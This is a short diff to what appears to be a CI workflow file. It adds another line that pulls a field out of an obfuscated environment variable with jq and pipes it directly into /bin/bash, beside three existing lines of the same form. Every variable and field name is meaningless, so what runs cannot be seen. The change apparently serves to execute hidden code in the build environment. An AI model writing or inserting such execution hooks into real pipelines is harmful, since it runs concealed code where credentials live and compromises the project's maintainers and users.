@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$qt578" | jq -r .exe8575 | /bin/bash
           echo $es923 | jq -r .sykq79 | /bin/bash
           echo $fqqt340 | jq -r .hsmm60620 | /bin/bash
+          printf '%s' "$cl3" | jq -r .q337 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
